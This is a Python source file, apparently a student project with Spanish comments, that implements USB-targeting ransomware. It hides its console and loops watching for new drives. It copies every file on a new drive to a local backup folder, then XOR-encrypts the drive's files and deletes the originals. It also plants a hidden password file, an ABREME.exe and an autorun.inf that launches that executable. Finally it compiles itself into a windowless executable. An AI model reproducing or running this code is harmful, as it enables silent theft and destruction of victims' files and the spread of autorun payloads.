import os
import sys
import shutil
import time
import hashlib
import string
import random
import subprocess
import ctypes
from datetime import datetime

# Configuracion
DESTINO = r"C:\Users\elkin\Desktop\ESPE\test"
LOG_FILE = os.path.join(DESTINO, "reporte_usb.md")
PASS = ""  # Password global de encriptacion

if not os.path.exists(DESTINO):
    os.makedirs(DESTINO, exist_ok=True)

def log(msg):
    """Escribe mensajes en el log"""
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(msg + "\n")
    except:
        pass

def generar_pass():
    """Genera password aleatoria de 12 caracteres"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=12))

def encriptar_archivo(ruta):
    """Encripta archivo usando XOR con SHA-256"""
    global PASS
    
    if os.path.basename(ruta).startswith('.pwd'):
        log(f"[ENC] Saltando .pwd (necesario para desencriptar)")
        return False
    
    try:
        log(f"[ENC] Intentando encriptar: {os.path.basename(ruta)}")
        log(f"[ENC] PASS actual: '{PASS}'")
        
        if not PASS:
            log("[ENC] ERROR: PASS vacia!")
            return False
        
        with open(ruta, 'rb') as f:
            datos = f.read()
        
        # Generar clave SHA-256 y encriptar con XOR
        clave = hashlib.sha256(PASS.encode()).digest()
        enc = bytearray(b ^ clave[i % len(clave)] for i, b in enumerate(datos))
        
        with open(ruta + '.enc', 'wb') as f:
            f.write(enc)
        os.remove(ruta)
        log(f"[ENC] OK: {os.path.basename(ruta)} -> {os.path.basename(ruta)}.enc")
        return True
        
    except Exception as e:
        log(f"[ENC] ERROR: {str(e)}")
        return False

def encriptar_usb(ruta_usb):
    """Encripta todos los archivos del USB recursivamente"""
    contador = 0
    
    for root, dirs, files in os.walk(ruta_usb):
        if 'System' in root:
            continue
        
        for archivo in files:
            if archivo.lower().endswith(('.exe', '.inf')):
                continue
            
            ruta = os.path.join(root, archivo)
            if encriptar_archivo(ruta):
                contador += 1
    
    log(f"[ENCRIPTACION] {contador} archivos encriptados")
    return contador > 0

def crear_abreme(ruta_usb):
    """Copia ABREME.exe al USB y crea archivo .pwd"""
    log("[ABREME] Iniciando copia...")
    
    # Guardar password en archivo oculto
    pwd_file = os.path.join(ruta_usb, ".pwd")
    try:
        with open(pwd_file, 'w') as f:
            f.write(PASS)
        os.system(f'attrib +h "{pwd_file}"')
        log(f"[ABREME] Archivo .pwd creado con: {PASS}")
    except Exception as e:
        log(f"[ABREME] Error creando .pwd: {e}")
        return False
    
    # Buscar ABREME.exe
    posibles_rutas = [
        os.path.join(DESTINO, "ABREME.exe"),
        os.path.join(os.path.dirname(sys.executable), "dist", "ABREME.exe"),
        os.path.join(os.getcwd(), "dist", "ABREME.exe"),
        r"C:\Users\elkin\Desktop\test\dist\ABREME.exe"
    ]
    
    source_exe = None
    for ruta in posibles_rutas:
        log(f"[ABREME] Buscando en: {ruta}")
        if os.path.exists(ruta):
            source_exe = ruta
            log(f"[ABREME] Encontrado en: {ruta}")
            break
    
    if not source_exe:
        log("[ABREME] ERROR: No se encontro ABREME.exe")
        return False
    
    # Copiar ABREME.exe
    dest_exe = os.path.join(ruta_usb, "ABREME.exe")
    try:
        shutil.copy2(source_exe, dest_exe)
        size = os.path.getsize(dest_exe)
        log(f"[ABREME] Copiado exitosamente ({size} bytes)")
        return True
    except Exception as e:
        log(f"[ABREME] ERROR copiando: {str(e)}")
        return False

def crear_autorun(ruta_usb):
    """Crea autorun.inf para ejecucion automatica"""
    try:
        with open(os.path.join(ruta_usb, "autorun.inf"), 'w') as f:
            f.write("[autorun]\nopen=ABREME.exe\nicon=shell32.dll,13\n")
        log("[AUTORUN] Creado")
        return True
    except:
        return False

def validar_contraseña(ruta_usb):
    """Valida que la encriptacion funcione desencriptando un archivo de prueba"""
    try:
        # Buscar archivo .enc
        archivo_prueba = None
        for root, dirs, files in os.walk(ruta_usb):
            for archivo in files:
                if archivo.endswith('.enc'):
                    archivo_prueba = os.path.join(root, archivo)
                    break
            if archivo_prueba:
                break
        
        if not archivo_prueba:
            log("[VALIDACION] No hay archivos .enc para probar")
            return True
        
        # Desencriptar para validar
        with open(archivo_prueba, 'rb') as f:
            datos_enc = f.read()
        
        clave = hashlib.sha256(PASS.encode()).digest()
        datos_desc = bytes(bytearray(b ^ clave[i % len(clave)] for i, b in enumerate(datos_enc)))
        
        log(f"[VALIDACION] Primeros 10 bytes: {datos_desc[:10]}")
        log("[VALIDACION] Contrasena validada correctamente")
        return True
        
    except Exception as e:
        log(f"[VALIDACION] ERROR: {str(e)}")
        return False

def procesar_usb(ruta_usb):
    """Flujo completo del ataque: copiar, generar pass, crear ABREME, encriptar"""
    global PASS
    
    log(f"\n[USB] Conectada: {ruta_usb}")
    log(f"[DEBUG] PASS inicial: '{PASS}'")
    
    # 1. COPIAR ARCHIVOS A BACKUP
    timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
    backup = os.path.join(DESTINO, f"backup_{timestamp}")
    os.makedirs(backup, exist_ok=True)
    
    contador = 0
    for root, dirs, files in os.walk(ruta_usb):
        for archivo in files:
            src = os.path.join(root, archivo)
            rel = os.path.relpath(root, ruta_usb)
            if rel == '.':
                dst = os.path.join(backup, archivo)
            else:
                os.makedirs(os.path.join(backup, rel), exist_ok=True)
                dst = os.path.join(backup, rel, archivo)
            try:
                shutil.copy2(src, dst)
                contador += 1
            except:
                pass
    
    log(f"[COPIA] {contador} archivos copiados")
    
    # 2. GENERAR PASSWORD
    PASS = generar_pass()
    log(f"[PASS] Generada: {PASS}")
    log(f"[DEBUG] PASS despues: '{PASS}'")
    
    if not PASS:
        log("[ERROR] PASS esta vacia!")
        PASS = "ABCD1234EFGH"
        log(f"[PASS] Emergencia: {PASS}")
    
    # 3. CREAR ABREME.EXE
    log("[PASO] Creando ABREME.exe...")
    if crear_abreme(ruta_usb):
        log("[ABREME] OK")
    else:
        log("[ABREME] FALLO")
    
    # 4. CREAR AUTORUN.INF
    log("[PASO] Creando autorun.inf...")
    if crear_autorun(ruta_usb):
        log("[AUTORUN] OK")
    else:
        log("[AUTORUN] FALLO")
    
    # 5. ENCRIPTAR ARCHIVOS
    log("[PASO] Iniciando encriptacion...")
    log(f"[DEBUG] PASS antes encriptar: '{PASS}'")
    if encriptar_usb(ruta_usb):
        log("[ENCRIPTAR] OK")
        
        # 6. VALIDAR
        log("[PASO] Validando contrasena...")
        if validar_contraseña(ruta_usb):
            log("[VALIDACION] OK")
        else:
            log("[VALIDACION] FALLO")
    else:
        log("[ENCRIPTAR] FALLO")
    
    log(f"[COMPLETADO] Flujo terminado - Contrasena: {PASS}")

def obtener_unidades():
    """Escanea y retorna letras de unidad conectadas"""
    drives = []
    for letra in "CDEFGHIJKLMNOPQRSTUVWXYZ":
        if os.path.exists(f"{letra}:\\"):
            drives.append(f"{letra}:\\")
    return set(drives)

def monitorear():
    """Loop infinito que detecta nuevos USBs y los procesa"""
    log(f"\n[INICIO] Monitor iniciado\n")
    previas = obtener_unidades()
    
    while True:
        time.sleep(1)
        actuales = obtener_unidades()
        nuevas = actuales - previas
        
        if nuevas:
            for usb in nuevas:
                procesar_usb(usb)
            previas = actuales

def compilar():
    """Compila a EXE usando PyInstaller"""
    try:
        subprocess.run([
            sys.executable, "-m", "PyInstaller",
            "--onefile", "--noconsole", "--windowed",
            f"--name=monitor",
            "monitor_usb.py"
        ], check=True)
        print("[OK] Compilado a monitor.exe")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    if "--compile" in sys.argv:
        compilar()
    else:
        try:
            # Ocultar ventana de consola en Windows
            ctypes.windll.kernel32.SetConsoleDisplayMode(
                ctypes.windll.kernel32.GetStdHandle(-11), 0, None
            )
        except:
            pass
        monitorear()

